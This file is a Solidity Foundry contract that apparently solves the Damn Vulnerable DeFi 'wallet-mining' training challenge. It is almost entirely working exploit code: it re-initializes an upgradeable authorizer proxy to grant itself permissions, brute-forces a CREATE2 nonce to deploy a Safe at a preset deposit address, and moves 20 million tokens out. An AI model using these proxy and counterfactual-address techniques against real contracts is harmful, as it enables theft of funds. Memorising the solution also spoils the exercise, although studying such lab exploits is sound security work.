// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {SafeProxyFactory} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxyFactory.sol";
import {Safe, OwnerManager, Enum} from "@safe-global/safe-smart-account/contracts/Safe.sol";
import {SafeProxy} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxy.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {WalletDeployer} from "../../src/wallet-mining/WalletDeployer.sol";
import {
    AuthorizerFactory, AuthorizerUpgradeable, TransparentProxy
} from "../../src/wallet-mining/AuthorizerFactory.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract Exploit is Test {
    address private immutable player;
    address private immutable user;
    address private immutable ward;
    address private immutable authorizer;
    address private immutable userDepositAddress;
    SafeProxyFactory private immutable proxyFactory;
    address private immutable singletonCopy;
    WalletDeployer private immutable walletDeployer;
    DamnValuableToken private immutable token;
    address private constant USER_DEPOSIT_ADDRESS = 0xCe07CF30B540Bb84ceC5dA5547e1cb4722F9E496;
    uint256 private constant DEPOSIT_TOKEN_AMOUNT = 20_000_000e18;
    uint256 private immutable userPk;

    constructor(
        address _player,
        address _user,
        address _ward,
        address _authorizer,
        address _userDepositAddress,
        SafeProxyFactory _proxyFactory,
        address _singletonCopy,
        WalletDeployer _walletDeployer,
        DamnValuableToken _token,
        uint256 _userPk
    ) {
        player = _player;
        user = _user;
        ward = _ward;
        authorizer = _authorizer;
        userDepositAddress = _userDepositAddress;
        proxyFactory = _proxyFactory;
        singletonCopy = _singletonCopy;
        walletDeployer = _walletDeployer;
        token = _token;
        userPk = _userPk;
    }

    function run() public {
        address[] memory owners = new address[](1);
        owners[0] = user;
        bytes memory initializer = abi.encodeCall(
            Safe.setup, (owners, 1, address(0), bytes(""), address(0), address(0), 0, payable(address(0)))
        );
        uint256 nonce = findNonce(initializer);
        address[] memory aims = new address[](1);
        address[] memory wards = new address[](1);

        wards[0] = address(this);
        aims[0] = USER_DEPOSIT_ADDRESS;
        (bool success,) = address(authorizer).call(abi.encodeCall(AuthorizerUpgradeable.init, (wards, aims)));
        require(success, "proxy call failed");
        walletDeployer.drop(aims[0], initializer, nonce);

        bytes memory data = abi.encodeWithSelector(IERC20.transfer.selector, user, DEPOSIT_TOKEN_AMOUNT);

        Safe safe = Safe(payable(USER_DEPOSIT_ADDRESS));
        bytes memory txData = safe.encodeTransactionData(
            address(token), // to
            0, // value
            data, // data
            Enum.Operation.Call, // operation
            0, // safeTxGas
            0, // baseGas
            0, // gasPrice
            address(0), // gasToken
            address(0), // refundReceiver
            safe.nonce() // nonce
        );
        bytes32 digest = keccak256(txData);

        (uint8 v, bytes32 r, bytes32 s) = vm.sign(userPk, digest);
        bytes memory signatures = abi.encodePacked(r, s, v);

        bool ok = safe.execTransaction(
            address(token), // to
            0, // value
            data, // data
            Enum.Operation.Call, // operation
            0,
            0,
            0, // safeTxGas, baseGas, gasPrice
            address(0), // gasToken
            payable(address(0)), // refundReceiver
            signatures
        );
        require(ok, "exec failed");

        IERC20(address(token)).transfer(ward, walletDeployer.pay());
    }

    function findNonce(bytes memory initializer) public view returns (uint256) {
        for (uint256 nonce = 0; nonce < 1000; nonce++) {
            address addr = getAddr(initializer, nonce);
            if (addr == USER_DEPOSIT_ADDRESS) {
                return nonce;
            }
        }
        return 0;
    }

    function getAddr(bytes memory initializer, uint256 saltNonce) public view returns (address) {
        bytes32 salt = keccak256(abi.encodePacked(keccak256(initializer), saltNonce));
        bytes memory deploymentData = abi.encodePacked(type(SafeProxy).creationCode, uint256(uint160(singletonCopy)));
        bytes32 _hash =
            keccak256(abi.encodePacked(bytes1(0xff), address(proxyFactory), salt, keccak256(deploymentData)));
        return address(uint160(uint256(_hash)));
    }
}
